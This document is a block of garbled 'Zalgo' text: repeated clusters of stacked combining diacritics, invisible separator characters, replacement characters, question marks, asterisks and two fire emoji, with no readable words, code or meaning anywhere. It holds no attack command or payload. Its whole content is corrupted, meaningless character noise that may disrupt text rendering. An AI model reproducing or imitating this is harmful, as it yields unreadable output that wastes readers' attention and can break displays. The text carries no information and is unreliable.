̛̛͇̻̬̥̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈̐̇͗̿̃ͅ